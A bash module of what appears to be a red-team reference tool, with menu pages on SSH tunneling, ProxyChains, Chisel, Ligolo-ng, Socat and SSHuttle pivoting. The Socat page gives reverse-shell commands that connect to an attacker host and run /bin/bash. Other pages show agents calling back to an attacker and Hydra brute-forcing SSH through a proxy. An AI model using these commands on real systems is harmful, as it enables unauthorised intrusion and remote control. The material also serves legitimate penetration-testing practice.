#!/usr/bin/env bash
# modules/red/tunneling.sh

red_tunneling() {
    while true; do
        local c
        c=$(dialog --backtitle "$(backtitle)" \
            --title "  🕳️  RED — Tunneling & Pivoting  " \
            --menu "\n  Pivoting & Proxy Techniques:\n" 18 65 6 \
            "1" "  🔐  SSH Tunneling" \
            "2" "  🔗  ProxyChains" \
            "3" "  🪄  Chisel — Fast TCP/UDP tunnel" \
            "4" "  🦎  Ligolo-ng — Layer 3 tunneling" \
            "5" "  🔌  Socat — Socket relay" \
            "6" "  🚀  SSHuttle — VPN over SSH" \
            3>&1 1>&2 2>&3) || return 0
        case "$c" in
            1) _red_ssh_tunnel ;;
            2) _red_proxychains ;;
            3) _red_chisel ;;
            4) _red_ligolo ;;
            5) _red_socat ;;
            6) _red_sshuttle ;;
        esac
    done
}

_red_ssh_tunnel() { show_page "SSH Tunneling" \
"═══════════════════════════════════════════════════════════════
  SSH Tunneling                                        [RED]
═══════════════════════════════════════════════════════════════

  ENABLE ON SERVER (sshd_config)
    AllowTcpForwarding Yes
    GatewayPorts Yes
    (service sshd restart)

  LOCAL TUNNEL (forward local port → remote)
    # Access remote 192.168.1.5:3306 via localhost:3306
    ssh -L 3306:192.168.1.5:3306 <USER>@<JUMP_HOST>

    # Access remote RDP via local port 13389
    ssh -L 13389:192.168.1.5:3389 <USER>@<JUMP_HOST>

  REMOTE TUNNEL (expose local port to remote)
    # Expose local port 443 on remote 0.0.0.0:8080
    ssh -R 0.0.0.0:8080:127.0.0.1:443 root@<REMOTE_IP>

    # Setup from existing session (in-band)
    Press: SHIFT + ~ + C
    ssh> -R 0.0.0.0:443:127.0.0.1:443

  DYNAMIC SOCKS PROXY
    # Create SOCKS5 proxy on local port 1080
    ssh -D 1080 <USER>@<JUMP_HOST>
    # Then configure proxychains to use 127.0.0.1:1080

  MULTI-HOP TUNNEL
    # Jump through two hosts to reach target
    ssh -J <USER>@<HOP1>,<USER>@<HOP2> <USER>@<FINAL>

  BACKGROUND TUNNEL (no shell)
    ssh -fN -L 3306:192.168.1.5:3306 <USER>@<JUMP_HOST>
    # -f = background, -N = no command

  AUTOSSH (keep tunnel alive)
    autossh -M 0 -fN \\
      -L 3306:192.168.1.5:3306 <USER>@<JUMP_HOST>"; }

_red_proxychains() { show_page "ProxyChains" \
"═══════════════════════════════════════════════════════════════
  ProxyChains                                          [RED]
═══════════════════════════════════════════════════════════════

  INSTALL
    # apt-get install proxychains4

  CONFIGURE /etc/proxychains.conf
    # Add proxy at end of file:
    socks4 <IP> <PORT>
    socks5 127.0.0.1 1080
    http   127.0.0.1 8080

    # Chain types (in config):
    dynamic_chain   (skip dead proxies)
    strict_chain    (all must work)
    random_chain    (random order)

  SETUP SOCKS PROXY VIA SSH
    # Create dynamic SOCKS proxy on port 1080
    ssh -D 1080 <USER>@<JUMP_HOST>

    # Add to proxychains.conf:
    socks5 127.0.0.1 1080

  RUN TOOLS THROUGH PROXY
    # Nmap through proxy
    proxychains nmap -sT -Pn -n -p 80,443,22 <INTERNAL_TARGET>

    # Curl through proxy
    proxychains curl http://<INTERNAL_TARGET>/

    # Firefox through proxy
    proxychains firefox

    # Hydra through proxy
    proxychains hydra -L users.txt -P pass.txt \\
      ssh://<INTERNAL_TARGET>

    # SQLmap through proxy
    proxychains sqlmap -u \"http://<INTERNAL>/?id=1\"

  TIPS
    - DNS leaks: set proxy_dns in proxychains.conf
    - ICMP/UDP won't work through SOCKS (TCP only)
    - For Nmap: use -sT (TCP connect) not -sS (SYN)"; }

_red_chisel() { show_page "Chisel — Fast TCP/UDP Tunneling" \
"═══════════════════════════════════════════════════════════════
  Chisel — Fast TCP/UDP Tunneling                      [RED]
═══════════════════════════════════════════════════════════════

  INSTALL
    # go install github.com/jpillora/chisel@latest
    # OR download release binary from GitHub

  SOCKS PROXY PIVOT
    # On attacker (server):
    chisel server -p 8888 --reverse

    # On target (client):
    chisel client <ATTACKER_IP>:8888 R:socks

    # Now use proxychains with socks5 127.0.0.1:1080

  LOCAL PORT FORWARD
    # On attacker (server):
    chisel server -p 8888 --reverse

    # On target — forward target's 192.168.1.5:80 to attacker's :8080
    chisel client <ATTACKER_IP>:8888 R:8080:192.168.1.5:80

  REMOTE PORT FORWARD
    # On attacker (server, no --reverse)
    chisel server -p 8888

    # On target — expose attacker's 8080 to target's 0.0.0.0:3000
    chisel client <ATTACKER_IP>:8888 3000:127.0.0.1:8080

  COMBINED TUNNEL (multiple ports)
    chisel client <ATTACKER_IP>:8888 \\
      R:3306:192.168.1.5:3306 \\
      R:8080:192.168.1.5:80 \\
      R:socks

  AUTH (secure tunnel)
    chisel server -p 8888 --auth user:pass --reverse
    chisel client --auth user:pass <ATTACKER_IP>:8888 R:socks"; }

_red_ligolo() { show_page "Ligolo-ng — Layer 3 Tunneling" \
"═══════════════════════════════════════════════════════════════
  Ligolo-ng — Layer 3 Tunneling                        [RED]
═══════════════════════════════════════════════════════════════

  WHAT IS IT?
    Ligolo-ng creates a TUN interface on attacker's machine.
    Traffic routed to the interface goes through the agent.
    Full layer-3 access (ICMP, UDP, TCP) to internal network.

  SETUP — Attacker (proxy)
    # Create TUN interface
    sudo ip tuntap add user \$(whoami) mode tun ligolo
    sudo ip link set ligolo up

    # Start proxy server
    ./proxy -selfcert -laddr 0.0.0.0:11601

  SETUP — Target (agent)
    # Windows
    agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert

    # Linux
    ./agent -connect <ATTACKER_IP>:11601 -ignore-cert

  CONFIGURE TUNNEL (in proxy console)
    [ligolo] >> session          (select session)
    [ligolo] >> ifconfig         (see target interfaces)
    [ligolo] >> start            (start tunnel)

  ADD ROUTES (attacker)
    sudo ip route add 192.168.1.0/24 dev ligolo
    sudo ip route add 10.10.10.0/24 dev ligolo

  NOW ACCESS INTERNAL NETWORK DIRECTLY
    nmap -sV 192.168.1.0/24   (no proxychains needed!)
    curl http://192.168.1.5/
    ssh user@192.168.1.10"; }

_red_socat() { show_page "Socat — Socket Relay" \
"═══════════════════════════════════════════════════════════════
  Socat — Socket Relay                                 [RED]
═══════════════════════════════════════════════════════════════

  BASIC TCP RELAY
    # Forward all traffic on port 8080 to 192.168.1.5:80
    socat TCP-LISTEN:8080,fork TCP:192.168.1.5:80

  REVERSE SHELL LISTENER
    socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

  CONNECT BACK (target)
    socat TCP:<ATTACKER_IP>:4444 EXEC:/bin/bash

  SSL ENCRYPTED SHELL
    # Attacker — generate cert and listen
    openssl req -newkey rsa:2048 -x509 -keyout key.pem \\
      -out cert.pem -days 30 -nodes
    socat OPENSSL-LISTEN:4444,cert=cert.pem,key=key.pem,\\
      verify=0 FILE:\\`tty\\`,raw,echo=0

    # Target — connect
    socat OPENSSL:<IP>:4444,verify=0 EXEC:/bin/bash

  UDP TUNNEL
    # Attacker listen
    socat UDP-LISTEN:5555,fork -

    # Target send
    socat - UDP:<ATTACKER_IP>:5555

  FILE TRANSFER
    # Receive
    socat TCP-LISTEN:9999,reuseaddr > received_file

    # Send
    socat TCP:<IP>:9999 < file_to_send

  PORT FORWARD (pivot through host)
    socat TCP-LISTEN:3389,fork \\
      TCP:192.168.1.5:3389 &"; }

_red_sshuttle() { show_page "SSHuttle — VPN over SSH" \
"═══════════════════════════════════════════════════════════════
  SSHuttle — VPN over SSH                              [RED]
═══════════════════════════════════════════════════════════════

  WHAT IS IT?
    SSHuttle creates a VPN-like tunnel over SSH.
    Routes entire subnets through SSH without full VPN setup.
    Requires Python on both ends.

  INSTALL
    # pip install sshuttle
    # apt-get install sshuttle

  BASIC USAGE (route a subnet)
    # Route 192.168.1.0/24 through jump host
    sshuttle -r <USER>@<JUMP_HOST> 192.168.1.0/24

  ROUTE ALL TRAFFIC
    sshuttle -r <USER>@<JUMP_HOST> 0.0.0.0/0

  EXCLUDE LOCAL NETWORKS
    sshuttle -r <USER>@<JUMP_HOST> \\
      192.168.1.0/24 \\
      -x 192.168.0.0/24      (exclude this subnet)

  WITH SSH KEY
    sshuttle -r <USER>@<JUMP_HOST> \\
      --ssh-cmd 'ssh -i ~/.ssh/id_rsa' \\
      192.168.1.0/24

  AUTO-DETECT SUBNETS
    sshuttle --dns -r <USER>@<JUMP_HOST> \\
      -v 0/0   (route all + DNS)

  MULTIPLE SUBNETS
    sshuttle -r <USER>@<JUMP_HOST> \\
      192.168.1.0/24 10.10.0.0/16

  BACKGROUND
    sshuttle -D -r <USER>@<JUMP_HOST> 192.168.1.0/24

  NOW ACCESS INTERNAL DIRECTLY
    ssh user@192.168.1.10
    curl http://192.168.1.5/
    nmap -sV 192.168.1.0/24"; }
